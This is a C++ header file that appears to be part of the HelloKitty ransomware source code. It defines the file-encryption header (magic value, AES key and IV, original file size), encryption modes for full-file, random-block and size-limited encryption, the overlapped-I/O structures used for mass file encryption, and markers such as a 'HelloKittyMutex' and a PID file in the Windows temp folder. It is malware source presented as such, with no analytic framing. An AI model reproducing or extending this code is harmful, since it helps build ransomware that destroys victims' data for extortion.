#pragma once


#include <windows.h>
#include <string>


#define AES_BLOCKLEN	16



#define ENCRYPTED_FILE_FLAG	(0xABCCDCDA + 1)
#define ENCRYPTION_MAGIC	0xBAADC0DE

#define ALIGNUP(value, alignment) (((value) + (alignment) - 1) & ~((alignment) - 1))
#define ALIGNDOWN(value,boundary) ((value)/(boundary)*(boundary))


const auto lpwFileWithEncryptorPid = L"%windir%\\temp\\kittypid.txt";
const auto lpwRegistryKeyValue = L"HelloKitty";
const auto lpwMutexName = L"HelloKittyMutex";

#define ENCTYPE_FULL_FILE		(1 << 1)
#define ENCTYPE_RANDOM_BLOCKS	(1 << 2)
#define ENCTYPE_LIMIT_FILE_SIZE	(1 << 3)
#define ENCTYPE_USE_CRC32		(1 << 4)

#pragma pack(push, 1)

typedef struct _enc_header {
	DWORD dwMagic;
	ULONGLONG qwOriginalFileSize;

	DWORD encType;
	DWORD blockSize;

	// random blocks
	DWORD StepRandSeed;
	DWORD StepRandMax;

	// full file
	//

	// limit file size
	ULONGLONG qwMaxEnctyptionSize;

	// if check crc32
	DWORD endBlockCrc32;

	byte aes_key[AES_BLOCKLEN];
	byte aes_iv[AES_BLOCKLEN];
} enc_header;

/*

typedef struct _enc_end_of_file
{
	byte rsa_encrypted_data[RSA_SIZE];
	DWORD dwEncryptedFlag;
} enc_end_of_file;
*/


const int operation_read_check_encrypted = 1;
const int operation_read = 2;
const int operation_write = 3;
const int operation_read_retry = 4;
const int operation_write_retry = 5;
const int operation_write_eof = 6;
const int operation_write_closehandle = 7;


#define DEFAULT_BLOCK_SIZE ((AES_BLOCKLEN * 1024) * 10)


typedef struct _over_struct {
	OVERLAPPED overlapped;
	HANDLE hFile;
	DWORD operation;
	std::wstring wFullFilePath;
	// uint8_t lastBlock[DEFAULT_BLOCK_SIZE];
	uint8_t tempbuff[DEFAULT_BLOCK_SIZE]; // must be aligned to AES_KEY_SIZE_BYTES (1mb)
	uint8_t outputbuff[DEFAULT_BLOCK_SIZE];
	// DWORD lastBytesReceivedSize;
	ULONGLONG currentBlock;
	ULONGLONG fileSize;
	enc_header encHeader;
	DWORD StepRandSeedRuntime;
	// AES_ctx aes;
	void* aes_ctx;
} over_struct;



#pragma pack(pop)


class Random
{
public:
	static DWORD Get(DWORD & m_dwRandSeed, DWORD dwMax)
	{
		if (!dwMax)
			dwMax = 1;
		m_dwRandSeed = (m_dwRandSeed * 0x08088405) + 1;
		return (m_dwRandSeed % dwMax);
	}
};
